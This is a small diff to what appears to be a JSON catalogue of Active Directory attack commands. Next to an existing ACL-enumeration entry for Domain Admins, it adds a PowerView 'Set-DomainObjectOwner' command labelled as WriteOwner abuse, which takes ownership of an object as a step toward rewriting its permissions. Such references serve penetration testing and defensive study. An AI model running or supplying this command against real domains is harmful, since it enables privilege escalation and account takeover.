@@ -96,6 +96,10 @@
     {
       "label": "Who has rights over Domain Admins",
       "command": "Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs -Verbose"
+    },
+    {
+      "label": "Set-DomainObjectOwner — WriteOwner abuse (take ownership, then WriteDACL)",
+      "command": "Set-DomainObjectOwner -Identity <target> -OwnerIdentity <attacker> -Credential $Cred"
     }
   ],
   "steps": [
